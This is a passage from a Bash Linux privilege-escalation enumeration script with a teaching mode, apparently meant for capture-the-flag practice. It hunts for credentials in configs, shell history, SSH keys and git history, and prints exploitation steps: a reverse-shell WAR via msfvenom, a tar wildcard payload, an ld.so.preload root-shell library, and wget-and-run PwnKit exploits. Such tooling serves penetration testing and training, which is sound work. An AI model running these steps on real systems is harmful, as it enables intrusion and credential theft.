            fi
        fi
    done
    
    # Check common config locations
    info "Checking common credential locations..."
    
    local cred_locations=(
        "/var/www/html/wp-config.php"
        "/var/www/html/config.php"
        "/.env"
        "/opt/*/config*"
        "/home/*/.config/*"
    )
    
    for pattern in "${cred_locations[@]}"; do
        find $(dirname "$pattern") -name "$(basename "$pattern")" 2>/dev/null | head -5 | while read file; do
            if grep -iE "password|secret|key|token" "$file" 2>/dev/null | head -1 | grep -q "."; then
                warn "Credentials found in: $file"
            fi
        done
    done
    
    # Check for SSH keys
    find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read key; do
        if [ -r "$key" ]; then
            critical "Readable SSH private key: $key - Use for lateral movement"
            warn "Readable SSH private key: $key"
            teach "Try this key for SSH access: ssh -i $key user@target"
        fi
    done
    info "Checking command history for ALL users..."
    while IFS=: read -r username x uid x x homedir shell; do
        if [ $uid -ge 1000 ] && [ -d "$homedir" ]; then
            for histfile in .bash_history .zsh_history .python_history .mysql_history; do
                if [ -r "$homedir/$histfile" ]; then
                    if grep -iE "password|passwd|pwd|secret|token|key|curl.*-u|wget.*password" "$homedir/$histfile" 2>/dev/null | head -5 | grep -q "."; then
                        critical "User $username history contains passwords: $homedir/$histfile"
                        vuln "Command history with credentials for user: $username"
                        grep -iE "password|passwd|pwd|secret|token" "$homedir/$histfile" 2>/dev/null | head -3 | while read line; do
                            log "  $line"
                        done
                    fi
                fi
            done
        fi
    done < /etc/passwd
}
# ============================================
# Software Version Checking
# ============================================

enum_software_versions() {
    section "INSTALLED SOFTWARE VERSION ANALYSIS"
    
    explain_concept "Vulnerable Software Detection" \
        "Outdated software often contains known exploitable vulnerabilities. Identifying installed versions helps locate attack vectors." \
        "Package managers track installed software. CVE databases document version-specific vulnerabilities. Attackers search for services running old versions with public exploits. Common targets: Apache, nginx, PHP, Python libraries, database servers." \
        "Process:\n  1. List installed packages\n  2. Identify versions\n  3. Cross-reference with exploit-db or searchsploit\n  4. Focus on network-facing services first"
    
    info "Enumerating installed packages ( a moment)..."
    
    # Detect package manager
    if command -v dpkg >/dev/null 2>&1; then
        info "Using dpkg (Debian/Ubuntu system)"
        
        # Check for commonly exploitable packages
        local targets=("apache2" "nginx" "php" "mysql-server" "postgresql" "openssh-server" "sudo" "polkit" "vim" "python3" "ruby" "nodejs")
        
        for pkg in "${targets[@]}"; do
            local version=$(dpkg -l "$pkg" 2>/dev/null | grep "^ii" | awk '{print $3}')
            if [ -n "$version" ]; then
                info "  $pkg: $version"
                teach "  Search exploits: searchsploit $pkg $version"
            fi
        done
        
    elif command -v rpm >/dev/null 2>&1; then
        info "Using rpm (RHEL/CentOS system)"
        
        local targets=("httpd" "nginx" "php" "mysql-server" "postgresql-server" "openssh-server" "sudo" "polkit" "vim" "python3")
        
        for pkg in "${targets[@]}"; do
            local version=$(rpm -q "$pkg" 2>/dev/null | grep -v "not installed")
            if [ -n "$version" ]; then
                info "  $version"
                teach "  Search exploits: searchsploit $pkg"
            fi
        done
    fi
    
    # Check web server versions directly
    if command -v apache2 >/dev/null 2>&1; then
        local apache_ver=$(apache2 -v 2>/dev/null | head -1)
        warn "Apache detected: $apache_ver"
        teach "Check for known Apache vulnerabilities for this version"
    fi
    
    if command -v nginx >/dev/null 2>&1; then
        local nginx_ver=$(nginx -v 2>&1)
        warn "Nginx detected: $nginx_ver"
        teach "Check for known Nginx vulnerabilities for this version"
    fi
    
    # Check interpreters
    if command -v php >/dev/null 2>&1; then
        local php_ver=$(php -v 2>/dev/null | head -1)
        warn "PHP detected: $php_ver"
        teach "Check for PHP CVEs: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html"
    fi
    
    # Check Python packages
    if command -v pip3 >/dev/null 2>&1; then
        info "Checking Python packages for known vulnerabilities..."
        teach "Run 'pip3 list --outdated' to see outdated packages"
        teach "Use 'safety check' to scan for known vulnerabilities"
    fi
}

# === INTERESTING FILES ===
enum_interesting_files() {
    section "INTERESTING FILE DISCOVERY"
    
    teach "Looking for unusual or interesting files that might contain flags, credentials, or other useful information..."
    
    # SUID/SGID files in unusual locations
    info "SUID/SGID files in non-standard locations:"
    find /home /tmp /var /opt -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -10 | while read file; do
        warn "  $file"
    done
    
    # Recently modified files
    info "Recently modified files (last 24 hours) in sensitive locations:"
    find /etc /root -type f -mtime -1 2>/dev/null | head -10 | while read file; do
        log "  $file"
    done
    
    # Files with passwords in name
    info "Files with 'password' in name:"
    find / -name "*password*" -o -name "*passwd*" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
    
    # Backup files
    info "Backup files that might contain credentials:"
    find /var/backups /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
}
# ============================================
# Enhanced Hidden File Search
# ============================================

enum_hidden_files() {
    section "HIDDEN FILES & DIRECTORIES"
    
    explain_concept "Hidden Files" \
        "Files/directories starting with '.' are hidden from normal 'ls' commands. Attackers use these to hide tools, backdoors, and persistence mechanisms." \
        "Unix convention: files starting with '.' don't appear in directory listings unless using 'ls -a'. This is a feature, not security, but attackers exploit it to hide malicious files in plain sight." \
        "Focus on:\n  • /tmp, /var/tmp, /dev/shm (temporary storage)\n  • User home directories\n  • Unusual locations like /, /opt, /usr"
    
    info "Searching for hidden files in sensitive locations..."
    
    # Check common hiding spots
    for dir in /tmp /var/tmp /dev/shm /opt /; do
        if [ -d "$dir" ]; then
            find "$dir" -maxdepth 2 -name ".*" -type f 2>/dev/null | while read hidden; do
                case "$(basename "$hidden")" in
                    .bash_history|.bashrc|.profile|.vimrc|.ssh|.cache|.local|.config|.gnupg)
                        # Normal hidden files, skip
                        ;;
                    *)
                        warn "Hidden file: $hidden"
                        
                        # Check if executable
                        if [ -x "$hidden" ]; then
                            vuln "Hidden EXECUTABLE: $hidden"
                        fi
                        
                        # Check if SUID
                        if [ -u "$hidden" ]; then
                            critical "Hidden SUID binary: $hidden"
                        fi
                        ;;
                esac
            done
            
            # Check for hidden directories
            find "$dir" -maxdepth 2 -name ".*" -type d 2>/dev/null | while read hidden_dir; do
                case "$(basename "$hidden_dir")" in
                    .ssh|.gnupg|.cache|.local|.config)
                        # Normal, skip
                        ;;
                    *)
                        warn "Hidden directory: $hidden_dir"
                        ;;
                esac
            done
        fi
    done
}

# ═══════════════════════════════════════════════════════════════
# ADDITIONAL ENUMERATION MODULES
# ═══════════════════════════════════════════════════════════════

# === SMB/SAMBA ENUMERATION ===
enum_smb() {
    section "SMB/SAMBA SHARE ENUMERATION"
    
    explain_concept "SMB/Samba Shares" \
        "SMB (Server Message Block) shares allow file sharing over a network. Misconfigurations can expose sensitive files or allow unauthorized access." \
        "Many systems allow 'null sessions' (no authentication) or have shares with weak permissions. Windows and Linux both use SMB/Samba for file sharing. HTB boxes frequently have readable or writable shares containing flags or credentials." \
        "Exploitation:\n  1. Check for null session: smbclient -N -L //TARGET\n  2. List shares: smbmap -H TARGET\n  3. Access share: smbclient //TARGET/share -N\n  4. Look for writable shares for payload delivery"
    
    # Check if SMB service is actually running
    local smb_running=0
    if systemctl is-active --quiet smbd 2>/dev/null || systemctl is-active --quiet nmbd 2>/dev/null; then
        smb_running=1
        warn "SMB service is ACTIVE"
    fi
    
    # Check if SMB tools are available
    if ! command -v smbclient >/dev/null 2>&1; then
        warn "smbclient not installed - cannot enumerate SMB shares"
        teach "Install with: apt install smbclient"
        return
    fi
    
    # Only check for network enumeration if service is running
    if [ $smb_running -eq 1 ]; then
        # Check for SMB ports
        if netstat -tuln 2>/dev/null | grep -qE ":445 |:139 "; then
            info "SMB ports detected (445 or 139)"
            
            # Try localhost enumeration
            info "Attempting null session enumeration on localhost..."
            local smb_shares=$(smbclient -N -L //127.0.0.1 2>/dev/null | grep "Disk" | awk '{print $1}')
            
            if [ -n "$smb_shares" ]; then
                critical "SMB shares accessible with null session"
                echo "$smb_shares" | while read share; do
                    log "  Share: $share"
                    
                    # Try to access the share
                    if smbclient -N "//127.0.0.1/$share" -c "ls" 2>/dev/null | grep -q "."; then
                        critical "Share $share is READABLE without authentication"
                        teach "Access with: smbclient -N //127.0.0.1/$share"
                    fi
                done
            else
                ok "No null session access to SMB shares"
            fi
        else
            ok "SMB ports not listening"
        fi
    fi
    
    # Check for Samba config (regardless of service status)
    if [ -r /etc/samba/smb.conf ]; then
        if [ $smb_running -eq 1 ]; then
            info "Checking Samba configuration (service is running)..."
        else
            info "Samba configuration found but service is not running"
        fi
        
        # Only flag as vulnerability if service is actually running
        if [ $smb_running -eq 1 ]; then
            # Check for writable shares
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -A 5 "\[.*\]" | grep -q "writable = yes\|read only = no"; then
                vuln "Writable SMB shares configured in active service"
                sed 's/[;#].*//' /etc/samba/smb.conf | grep -A 5 "writable = yes\|read only = no" | head -10
                teach "Check share permissions and accessible paths"
            fi
            
            # Check for guest access
            if sed 's/[;#].*//' /etc/samba/smb.conf | grep -v '^[[:space:]]*$' | grep -qi "guest.*ok.*yes\|map.*to.*guest\|usershare.*allow.*guests.*yes"; then
                vuln "Guest access configured in active Samba service"
                warn "SMB shares allow guest access or map failed logins to guest"
                teach "Guest can access shares without authentication"
            fi
        else
            ok "Samba configured but service is inactive - no active vulnerability"
        fi
    fi
}
# === EXPOSED .GIT DIRECTORY ===
enum_git_exposure() {
    section "EXPOSED .GIT DIRECTORY ENUMERATION"
    
    explain_concept "Exposed .git Directories" \
        "Web applications sometimes deploy with their .git directory accessible, exposing the entire source code repository including commit history." \
        "Developers deploy code using 'git clone' or 'git pull' in the web root, forgetting that .git/ contains the complete repository. This includes all commits, deleted files, configuration with credentials, and development history. HTB boxes love this misconfiguration." \
        "Exploitation:\n  1. Check: curl http://target/.git/config\n  2. Dump repo: git-dumper http://target/.git /output/dir\n  3. Review history: git log --all\n  4. Search for secrets: git log -p | grep -i password"
    
    # Check common web roots for .git
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -d "$webroot/.git" ]; then
            critical "EXPOSED .git directory: $webroot/.git"
            vuln "Git repository in web root: $webroot/.git"
            
            if [ -r "$webroot/.git/config" ]; then
                critical "Git config readable - may contain credentials"
                info "Git config location: $webroot/.git/config"
                
                # Check for remote URLs with credentials
                if grep -E "https://.*:.*@" "$webroot/.git/config" 2>/dev/null | grep -q "."; then
                    critical "Git remote URL contains embedded credentials"
                    grep -E "url = " "$webroot/.git/config" 2>/dev/null
                fi
            fi
            
            # Check git logs for interesting commits
            if [ -d "$webroot/.git" ]; then
                cd "$webroot" 2>/dev/null && {
                    info "Checking git commit history..."
                    local commit_count=$(git log --all 2>/dev/null | grep "^commit" | wc -l)
                    if [ $commit_count -gt 0 ]; then
                        warn "Repository has $commit_count commits - review history for secrets"
                        teach "Commands to review:"
                        teach "  cd $webroot"
                        teach "  git log --all"
                        teach "  git log -p | grep -i 'password\\|secret\\|key'"
                        teach "  git show [commit-hash]"
                    fi
                }
            fi
            
            teach "If accessible via web:"
            teach "  1. Use git-dumper to clone: git-dumper http://target/.git /output"
            teach "  2. Review all branches: git branch -a"
            teach "  3. Check deleted files: git log --diff-filter=D --summary"
        fi
    done
    
    # Check if in a git repo currently
    if [ -d ".git" ] && [ -r ".git/config" ]; then
        warn "Current directory is a git repository"
        info "Git config: ./.git/config"
        
        if git log -p 2>/dev/null | grep -iE "password|secret|key|token" | head -3 | grep -q "."; then
            vuln "Git history contains potential secrets"
            teach "Review with: git log -p | grep -i password"
        fi
    fi
}

# === TOMCAT MANAGER ENUMERATION ===
enum_tomcat() {
    section "APACHE TOMCAT ENUMERATION"
    
    explain_concept "Tomcat Manager Application" \
        "Apache Tomcat's manager application allows deploying WAR files. Default credentials or weak passwords give instant code execution." \
        "Tomcat manager (/manager/html) is used to deploy web applications. If accessible with default or weak credentials, you can upload a malicious WAR file containing a web shell. This is essentially RCE with one upload. HTB loves Tomcat boxes." \
        "Exploitation:\n  1. Access /manager/html\n  2. Try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret\n  3. Generate WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war\n  4. Upload via manager interface\n  5. Trigger: curl http://target:8080/shell/"
    
    # Check for Tomcat ports
    if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8009 "; then
        warn "Tomcat ports detected (8080 or 8009)"
        
        # Check for Tomcat installation
        local tomcat_dirs=("/opt/tomcat" "/usr/share/tomcat" "/var/lib/tomcat" "/opt/apache-tomcat")
        
        for tomcat_dir in "${tomcat_dirs[@]}"; do
            if [ -d "$tomcat_dir" ]; then
                info "Tomcat installation found: $tomcat_dir"
                
                # Check tomcat-users.xml
                if [ -r "$tomcat_dir/conf/tomcat-users.xml" ]; then
                    critical "tomcat-users.xml is READABLE: $tomcat_dir/conf/tomcat-users.xml"
                    
                    if grep -E "role.*manager" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | grep -q "."; then
                        critical "Manager role configured with credentials"
                        vuln "Tomcat manager credentials exposed in tomcat-users.xml"
                        grep -E "role.*manager|user.*password" "$tomcat_dir/conf/tomcat-users.xml" 2>/dev/null | head -5
                        
                        teach "Extract credentials and access manager at:"
                        teach "  http://localhost:8080/manager/html"
                    fi
                fi
                
                # Check for manager application
                if [ -d "$tomcat_dir/webapps/manager" ]; then
                    warn "Tomcat manager application is deployed"
                    teach "Common default credentials to try:"
                    teach "  tomcat:tomcat"
                    teach "  admin:admin"
                    teach "  tomcat:s3cret"
                    teach "  admin:password"
                fi
            fi
        done
    else
        ok "Tomcat ports not detected"
    fi
}

# === SPRING BOOT ACTUATOR ===
enum_spring_actuator() {
    section "SPRING BOOT ACTUATOR ENUMERATION"
    
    explain_concept "Spring Boot Actuators" \
        "Spring Boot applications expose 'actuator' endpoints for monitoring and management. Misconfigured actuators leak sensitive information or allow RCE." \
        "Spring Boot's actuator endpoints provide app metrics, health info, and environment variables. If exposed without authentication, they leak database passwords, API keys, and app config. Some endpoints like /jolokia or /env can lead to RCE." \
        "Common endpoints:\n  /actuator - Lists available endpoints\n  /actuator/env - Environment variables (passwords!)\n  /actuator/health - App health (sometimes shows DB status)\n  /actuator/mappings - All routes\n  /actuator/heapdump - Memory dump (credentials in memory)"
    
    # Check for Java processes
    if ps aux | grep -iE "java.*spring|spring.*boot" | grep -v grep | grep -q "."; then
        warn "Spring Boot application detected in running processes"
        
        info "Checking common Spring Boot actuator endpoints..."
        
        # Check for listening ports that might be Spring Boot
        if netstat -tuln 2>/dev/null | grep -qE ":8080 |:8081 |:8443 "; then
            info "Potential Spring Boot ports detected"
            
            teach "If you have web access, check these endpoints:"
            teach "  curl http://target:8080/actuator"
            teach "  curl http://target:8080/actuator/env"
            teach "  curl http://target:8080/actuator/heapdump"
            teach "  curl http://target:8080/actuator/mappings"
            teach "  curl http://target:8080/env (older Spring Boot)"
        fi
    fi
    
    # Check web roots for Spring Boot applications
    local web_roots=("/var/www" "/opt" "/usr/local")
    
    for webroot in "${web_roots[@]}"; do
        find "$webroot" -name "*.jar" 2>/dev/null | head -10 | while read jar; do
            if unzip -l "$jar" 2>/dev/null | grep -q "spring-boot"; then
                warn "Spring Boot JAR found: $jar"
                
                # Check for application.properties or application.yml
                local app_dir=$(dirname "$jar")
                if [ -r "$app_dir/application.properties" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.properties"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.properties" 2>/dev/null | head -3
                    fi
                fi
                
                if [ -r "$app_dir/application.yml" ]; then
                    vuln "Spring Boot config readable: $app_dir/application.yml"
                    
                    if grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3 | grep -q "."; then
                        critical "Spring Boot YAML config contains credentials"
                        grep -iE "password|secret|key" "$app_dir/application.yml" 2>/dev/null | head -3
                    fi
                fi
            fi
        done
    done
}

# === WORDPRESS EXTENDED ===
enum_wordpress_extended() {
    section "WORDPRESS EXTENDED ENUMERATION"
    
    explain_concept "WordPress Vulnerabilities" \
        "WordPress sites have many attack surfaces: plugins, themes, xmlrpc.php, user enumeration via JSON API, and configuration backups." \
        "WordPress is extremely common and frequently misconfigured. Plugin/theme vulnerabilities are constantly discovered. The xmlrpc.php file allows authentication brute forcing with amplification. The wp-json API leaks usernames. Config backups expose database credentials." \
        "Attack vectors:\n  • Plugin/theme vulnerabilities (check version against exploit-db)\n  • User enumeration: curl http://site/wp-json/wp/v2/users\n  • xmlrpc.php brute force amplification\n  • wp-config.php backups (.bak, .old, ~, .save)\n  • Unprotected wp-admin/install.php"
    
    # Check for WordPress installations
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    
    for webroot in "${web_roots[@]}"; do
        if [ -f "$webroot/wp-config.php" ]; then
            info "WordPress installation found: $webroot"
            
            # Check for wp-config.php
            if [ -r "$webroot/wp-config.php" ]; then
                critical "wp-config.php is READABLE - contains database credentials"
                vuln "WordPress config readable: $webroot/wp-config.php"
                
                # Extract DB credentials
                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
                    critical "Database credentials in wp-config.php"
                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                fi
                
                # Check for authentication keys
                if grep -E "AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY" "$webroot/wp-config.php" 2>/dev/null | grep -q "put your unique phrase here"; then
                    warn "WordPress using default authentication keys"
                    teach "Default keys = weaker session security"
                fi
            fi
            
            # Check for wp-config backups
            find "$webroot" -name "wp-config.php*" -o -name "*wp-config*" 2>/dev/null | grep -vE "wp-config.php$" | while read backup; do
                if [ -r "$backup" ]; then
                    critical "wp-config backup found: $backup"
                    vuln "WordPress config backup: $backup"
                fi
            done
            
            # Check xmlrpc.php
            if [ -f "$webroot/xmlrpc.php" ]; then
                warn "xmlrpc.php present - enables brute force amplification"
                teach "Test if enabled: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
                teach "If enabled, can amplify brute force attacks significantly"
            fi
            
            # Check for wp-json API
            if [ -d "$webroot/wp-json" ] || [ -d "$webroot/wp-includes/rest-api" ]; then
                info "WordPress REST API present"
                teach "Enumerate users: curl http://target/wp-json/wp/v2/users"
                teach "Leaked usernames can be used for brute forcing"
            fi
            
            # Check plugins
            if [ -d "$webroot/wp-content/plugins" ]; then
                info "Checking installed plugins..."
                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                warn "Found $plugin_count installed plugins"
                
                # List plugins
                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -10 | while read plugin; do
                    log "  Plugin: $plugin"
                    
                    # Check for readme files that reveal version
                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
                        if [ -n "$version" ]; then
                            info "  Version: $version"
                            teach "  Check exploit-db for: $plugin $version"
                        fi
                    fi
                done
                
                teach "\nPlugin enumeration:"
                teach "  Search exploit-db: searchsploit wordpress [plugin-name]"
                teach "  Or use: wpscan --url http://target --enumerate p"
            fi
        fi
    done
}


# ═══════════════════════════════════════════════════════════════
# === TOOLS AVAILABILITY ===
enum_tools() {
    section "INSTALLED TOOLS & COMPILERS"
    
    teach "Available tools affect exploitation options. Compilers let you build exploits. Network tools enable pivoting."
    
    local tools=(
        "gcc:Compile C exploits"
        "g++:Compile C++ exploits"
        "python:Run exploit scripts and pty shells"
        "python3:Modern Python exploits"
        "perl:Run Perl exploits"
        "ruby:Run Ruby exploits"
        "wget:Download exploits and tools"
        "curl:Download files and interact with APIs"
        "nc:Netcat for reverse shells"
        "ncat:Modern netcat with SSL support"
        "socat:Advanced socket relay tool"
        "nmap:Port scanning and service detection"
        "tcpdump:Packet capture for network analysis"
        "git:Clone exploit repositories"
        "docker:Container management (check group!)"
        "kubectl:Kubernetes control (if in cluster)"
    )
    
    for tool_desc in "${tools[@]}"; do
        local tool=$(echo "$tool_desc" | cut -d: -f1)
        local desc=$(echo "$tool_desc" | cut -d: -f2)
        
        if command -v "$tool" >/dev/null 2>&1; then
            info "✓ $tool - $desc"
        fi
    done
    
    # Check for language interpreters
    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
        teach "Python available - use for pty shells: python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    fi
}

# === WILDCARD INJECTION ===
enum_wildcards() {
    section "WILDCARD INJECTION OPPORTUNITIES"
    
    explain_concept "Wildcard Injection" \
        "When scripts use wildcards (*, ?) with commands, specially named files can be interpreted as command arguments." \
        "Shell expands wildcards before passing to command. If script does 'tar -czf backup.tar.gz *', files named '--checkpoint=1' become arguments to tar. Commands process arguments before files." \
        "Common targets:\n  • tar with * → --checkpoint-action\n  • rsync with * → -e option\n  • chown with * → --reference\n  • Any command taking options starting with -"
    
    # Look for scripts using wildcards
    find /var/scripts /usr/local/bin /opt -name "*.sh" -readable 2>/dev/null | while read script; do
        if grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | grep -q "."; then
            warn "Script uses wildcards: $script"
            grep -E "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*" "$script" 2>/dev/null | while read line; do
                log "  $line"
            done
            
            teach "Exploitation example for tar:"
            teach "  echo '#!/bin/sh' > shell.sh"
            teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
            teach "  chmod +x shell.sh"
            teach "  touch -- '--checkpoint=1'"
            teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
        fi
    done
}
# === WRITABLE LD.SO.PRELOAD ===
enum_ld_preload() {
    section "LD.SO.PRELOAD ANALYSIS"
    
    explain_concept "ld.so.preload File" \
        "The /etc/ld.so.preload file forces the dynamic linker to load specified libraries before all others, for every program execution." \
        "If writable, you can force your malicious library to load into every process that starts, including those running as root. This gives instant root access the next time any SUID binary or root process starts." \
        "Exploitation:\n  1. Create malicious library: gcc -shared -fPIC -o /tmp/evil.so evil.c\n  2. Add to preload: echo '/tmp/evil.so' > /etc/ld.so.preload\n  3. Wait for or trigger any SUID binary execution\n  4. Your code runs as root"
    
    if [ -f /etc/ld.so.preload ]; then
        if [ -w /etc/ld.so.preload ]; then
            critical "ld.so.preload is WRITABLE - Instant root via library injection"
            vuln "/etc/ld.so.preload is WRITABLE!"
            teach "Malicious library template (evil.c):"
            teach "  #include <stdio.h>"
            teach "  #include <sys/types.h>"
            teach "  #include <stdlib.h>"
            teach "  void _init() {"
            teach "      unsetenv(\"LD_PRELOAD\");"
            teach "      setgid(0); setuid(0);"
            teach "      system(\"/bin/bash -p\");"
            teach "  }"
            teach "Compile and inject: gcc -shared -fPIC -o /tmp/evil.so evil.c && echo '/tmp/evil.so' > /etc/ld.so.preload"
        else
            ok "/etc/ld.so.preload exists but not writable"
        fi
    else
        ok "/etc/ld.so.preload does not exist"
    fi
    
    # Check ld.so.conf.d directory
    if [ -d /etc/ld.so.conf.d ]; then
        if [ -w /etc/ld.so.conf.d ]; then
            critical "ld.so.conf.d directory WRITABLE - Add malicious library paths"
            vuln "/etc/ld.so.conf.d/ is WRITABLE!"
            teach "Create config file pointing to your malicious library directory"
            teach "  echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig"
        fi
    fi
}

# === SYSTEMD TIMERS ===
enum_systemd_timers() {
    section "SYSTEMD TIMER ANALYSIS"
    
    explain_concept "Systemd Timers" \
        "Systemd timers are the modern replacement for cron jobs. Like services, writable timer files running as root give you code execution." \
        "Timers trigger service execution on a schedule. If you can modify a timer or its associated service that runs as root, you control what executes and when." \
        "Exploitation:\n  1. Find writable timer: /etc/systemd/system/*.timer\n  2. Modify associated service's ExecStart\n  3. Or modify timer's OnCalendar to trigger immediately\n  4. systemctl daemon-reload && systemctl start timer-name"
    
    # Check for writable timer files
    find /etc/systemd/system /lib/systemd/system -name "*.timer" -type f 2>/dev/null | while read timer; do
        if [ -w "$timer" ] && [ ! -L "$timer" ]; then
            critical "Writable systemd timer: $timer"
            vuln "Writable systemd timer: $timer"
            
            # Find associated service
            local service=$(grep "Unit=" "$timer" 2>/dev/null | cut -d= -f2)
            if [ -n "$service" ]; then
                info "  Associated service: $service"
                if [ -w "/etc/systemd/system/$service" ] || [ -w "/lib/systemd/system/$service" ]; then
                    critical "  Associated service is ALSO writable!"
                fi
            fi
        fi
    done
    
    # List active timers
    if command -v systemctl >/dev/null 2>&1; then
        local timer_count=$(systemctl list-timers --no-pager 2>/dev/null | grep -c "\.timer")
        if [ $timer_count -gt 0 ]; then
            info "Active timers: $timer_count"
            teach "List all timers: systemctl list-timers"
            teach "Check timer details: systemctl cat <timer-name>"
        fi
    fi
}

# === POLKIT/PKEXEC ===
enum_polkit() {
    section "POLKIT/PKEXEC ANALYSIS"
    
    explain_concept "Polkit (PolicyKit)" \
        "Polkit allows unprivileged processes to communicate with privileged ones. pkexec is like sudo but uses polkit for authorization." \
        "Desktop Linux needs fine-grained access control. Example: You click 'Install Updates' - the GUI runs as your user but needs root to install packages. Polkit acts as the middleman, checking if you're authorized. pkexec is the command-line equivalent of sudo, but instead of /etc/sudoers, it uses polkit policies." \
        "How it works:\n  1. Unprivileged process wants to do privileged action\n  2. Asks polkit: 'Am I allowed?'\n  3. Polkit checks policies in /usr/share/polkit-1/actions/\n  4. May prompt for password\n  5. If authorized, polkit grants access\n\nWhy vulnerabilities matter:\n  • pkexec is SUID root (runs as root)\n  • Processes user input (authentication, environment)\n  • Complex codebase handling security decisions\n  • Used by default on most Linux desktops"
    
    if ! command -v pkexec >/dev/null 2>&1; then
        ok "pkexec not installed"
        return
    fi
    
    local pkexec_path=$(which pkexec)
    local has_vulnerability=0
    local has_writable_rules=0
    
    info "pkexec found: $pkexec_path"
    
    # Check version for PwnKit
    local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
    if [ -n "$version" ]; then
        info "pkexec version: $version"
        
        # Simple version comparison for 0.120
        local major=$(echo "$version" | cut -d. -f1)
        local minor=$(echo "$version" | cut -d. -f2)
        
        if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
            has_vulnerability=1
            critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
            vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2021-4034 - PwnKit (Memory Corruption)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A memory corruption vulnerability in pkexec that allows ANY"
            teach "  user to get root WITHOUT needing a password or any special"
            teach "  permissions. One of the most critical vulnerabilities of 2022."
            teach ""
            teach "BACKGROUND - What is pkexec:"
            teach "  pkexec is like sudo but uses polkit for authorization."
            teach "  Example: pkexec /bin/bash (asks for password, gives root shell)"
            teach "  It's SUID root, meaning it runs with root privileges."
            teach ""
            teach "WHY IT EXISTS - The Technical Flaw:"
            teach "  When you run a program in Linux, it receives arguments in an array."
            teach "  Example: ./program arg1 arg2 arg3"
            teach "  The array looks like: ['program', 'arg1', 'arg2', 'arg3', NULL]"
            teach ""
            teach "  pkexec makes a critical mistake when handling this array:"
            teach "  1. It counts the number of arguments"
            teach "  2. It removes the first argument (the program name)"
            teach "  3. It shifts everything down"
            teach ""
            teach "  THE BUG:"
            teach "  If you call pkexec with ZERO arguments (no command to execute),"
            teach "  pkexec tries to remove argument[0] but there's nothing there!"
            teach ""
            teach "  What happens:"
            teach "  1. pkexec receives: argv[0] = NULL (empty)"
            teach "  2. Tries to remove argv[0]"
            teach "  3. Shifts down, but shifts ENVIRONMENT variables instead"
            teach "  4. Now environment variables are in the argument array"
            teach "  5. pkexec processes them as if they were arguments"
            teach "  6. Attacker can inject malicious environment variables"
            teach "  7. These get executed with root privileges"
            teach ""
            teach "SIMPLIFIED ANALOGY:"
            teach "  Imagine a security guard checking a list of people:"
            teach "  1. Guard expects: [Name, ID, Purpose]"
            teach "  2. You give empty list: []"
            teach "  3. Guard removes first item (nothing there)"
            teach "  4. Guard accidentally reads from the NEXT paper (environment vars)"
            teach "  5. Treats that paper as if it was the approved list"
            teach "  6. You've tricked the guard into reading your fake approval"
            teach ""
            teach "WHY IT EXISTED FOR 12+ YEARS:"
            teach "  The vulnerability was introduced in pkexec's first version (2009)."
            teach "  It's a subtle bug - only triggers when argc = 0, which normally"
            teach "  never happens (programs always have at least one argument)."
            teach "  Took until 2021 for someone to think: 'What if argc = 0?'"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach ""
            teach "  Method 1 - Use public exploit:"
            teach "  1. Download PwnKit exploit:"
            teach "     wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
            teach "  2. Make it executable:"
            teach "     chmod +x PwnKit"
            teach "  3. Run it:"
            teach "     ./PwnKit"
            teach "  4. Get root shell immediately"
            teach ""
            teach "  Method 2 - Compile from source:"
            teach "  1. Download C exploit code:"
            teach "     wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c"
            teach "  2. Compile:"
            teach "     gcc cve-2021-4034.c -o exploit"
            teach "  3. Run:"
            teach "     ./exploit"
            teach ""
            teach "  The exploit works by:"
            teach "  1. Calling pkexec with argc = 0 (no arguments)"
